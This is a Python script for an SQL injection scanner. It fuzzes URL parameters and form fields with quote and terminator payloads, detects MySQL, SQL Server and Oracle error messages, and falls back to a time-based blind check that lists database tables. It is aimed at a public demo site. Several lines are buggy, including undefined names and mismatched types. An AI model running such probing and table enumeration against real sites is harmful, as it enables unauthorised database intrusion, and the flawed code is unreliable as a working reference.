from urllib.parse import urlparse
import re
import requests
from bs4 import BeautifulSoup as bs
import Blinder
from forms import *


class sql:
    payloads = ["'", '#', "' FOO"]
    value_terminators = ["'", ";SELECT 1", "%00"]
    #Will used for blind ınjection later on
    crawled_urls = []

    def __init__(self, url , cookies=None):
        self.url = url
        self.cookies = cookies

    def identify_url(self):
        url_scheme = urlparse(self.url)
        return url_scheme

    def fuzz_url(self, url_scheme):
        if url_scheme.query != "":
            for term in sql.value_terminators:
                link = url_scheme.scheme + "://" + url_scheme.netloc + "/" \
                       + url_scheme.path + "?" + url_scheme.query + term
                content = bs(requests.get(link).content, "html.parser")
                vulnerability = is_vulnerable(content, link)
                if not vulnerability:
                    is_blind(self.url)

    def fuzz_Forms(self):
        form_list = forms(self.url, self.cookies)
        for form in form_list:
            for P in sqlscanner.payloads:
                response = submit(self.url, form_specs=form, cookies=self.cookies, payload=P)
                if is_vulnerable(response[0], self.url):
                    print("SQL Injection at {0} with {1} payload with form {2}".format(self.url, P, form))
                else:
                    sqlscanner.crawled_urls.append(self.url)



def is_vulnerable(response, url):
    errors = [
        # MySQL
        "you have an error in your sql syntax;",
        "Warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    ]
    decoded_object = response.decode().lower()
    for error in errors:
        if decoded_object.find(error) > -1:
            print("SQL Injection at {}".format(url))
            return True
    return False


def is_blind(url):
    blindCheck = Blinder.blinder(url, sleep=2)
    if blindCheck.check_injection():
        print("Blind SQL Injection at {}".format(url))
        print(blindCheck.get_tables())



if __name__ == '__main__':
    sqlscanner = sql("http://testphp.vulnweb.com/userinfo.php", cookies={"login": "test/test"})
    sqlscanner.fuzz_Forms()
